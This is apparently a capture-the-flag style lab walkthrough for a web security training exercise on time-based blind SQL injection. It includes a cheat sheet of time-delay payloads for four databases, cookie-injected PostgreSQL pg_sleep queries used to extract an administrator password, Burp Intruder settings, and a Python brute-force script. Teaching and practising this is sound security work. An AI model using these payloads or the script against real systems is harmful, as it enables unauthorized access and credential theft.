# Blind SQL Injection with time delays and information retrieval

# Review

In some of the preceding examples, we've seen how you can exploit the way applications fail to properly handle database errors. But what if the application catches these errors and handles them gracefully? Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.

The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

The first of these inputs will not trigger a delay, because the condition `1=2` is false. The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

### Cheat sheet

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle | dbms_pipe.receive_message(('a'),10) |
| --- | --- |
| Microsoft | WAITFOR DELAY '0:0:10' |
| PostgreSQL | SELECT pg_sleep(10) |
| MySQL | SELECT SLEEP(10) |

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual |
| --- | --- |
| Microsoft | IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' |
| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END |
| MySQL | SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') |

# Lab Instruction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

# Lab Walkthrough

### Verify database type

Modify the request as:

```
Cookie: TrackingId=none'||pg_sleep(10)--; session=ajlei4zlhDtl54fg149spJ4wwsAEZ0iu
```

Verify that the ****************response**************** is delayed 10 seconds → The target database is **********************PostgreSQL**********************

Let’s concatenate the query with more complex condition

```
Cookie: TrackingId=none'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--;
```

The `%3B` is decoded by `URL` as a semi-colon `;` to avoid separating the query

Verify that the application takes 10 second for the responding → The query is a valid syntax

### Verify username is `administrator`

Modify the query as:

```
Cookie: TrackingId=none'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Verify it is true

### Find password length

```
Cookie: TrackingId=none'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Increase the number of password length `1` until the application responses immediately

This step could be done manually or using BurpSuite ********Intruder********:

Send the current request to tab ****************Intruder**************** by pressing `Ctrl + I`. Then add the `§` between the `1` :

```
Cookie: TrackingId=none'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>§1§) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Switch to `Resource pool` tab → Select `Create new resource pool` → Enter the name for the pool and **********check********** the box of `Maximum concurrent requests` → Set it value as `1`

![Untitled](Blind%20SQL%20Injection%20with%20time%20delays%20and%20informati%20images/Untitled.png)

Click `Start attack` → Click on the `Columns` drop-down menu → Click `Response received` (This will represent the number of milliseconds the application took to respond)

![Untitled](Blind%20SQL%20Injection%20with%20time%20delays%20and%20informati%20images/Untitled%201.png)

Once the attack is done → Check out the result and focus on the request which has the `response received` value is smaller than 10000 → At that request’s payload, the application responded immediately → It was a false condition

![Untitled](Blind%20SQL%20Injection%20with%20time%20delays%20and%20informati%20images/Untitled%202.png)

The request which has payload `20`  → The password’s length is not smaller than `20` → It is equal to `20` → The password has ****20**** characters long

### Explore the password

Modify the request as:

```
Cookie: TrackingId=none'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Choose the attack type to `Cluster Bomb` → Go to ****************Payloads**************** tab → Set the payload set 1 (`§1§`) to a N**umber list** from **1** to ****20**** (as the password length) → Set the payload set **2** (`§a§`) to a **********************Simple list********************** which contains lower-case alphanumeric characters

![Untitled](Blind%20SQL%20Injection%20with%20time%20delays%20and%20informati%20images/Untitled%203.png)

![Untitled](Blind%20SQL%20Injection%20with%20time%20delays%20and%20informati%20images/Untitled%204.png)

Click ************************Start attack************************ and wait for awhile → Combine all of the **characters in payloads** of the ****************requests**************** that took more than 10000 millisecond for ********************responding******************** 

Use the password to login as `adminsitrator` and solve the lab

Or you can use this [source code](Blind_SQL_Injection_with_Time_delay_and_Conditional.py) to solve this manually by replacing the position of the password characters

```python
import requests

s = requests.Session()

url = "https://0aa7005904e463c481bb4d7c00370004.web-security-academy.net/login" # Change this
# original cookie
cookie = {"TrackingId":""}
# payload
p = "none'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='@') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"

wordlist = 'qwertyuiopasdfghjklzxcvbnm0987654321'

for char in wordlist:
	new_p = p.replace('@', char)
	cookie['TrackingId'] = new_p
	print(f"Send request with payload {char}")
	res = s.get(url,cookies=cookie)
	if res.elapsed.total_seconds() > 10:
		print(f"[+] Character {char} found!")
		with open('password.txt', 'a') as f:
			f.write(char)
			print("Char has been written")
		break
print("Increase the password position for the next request")
```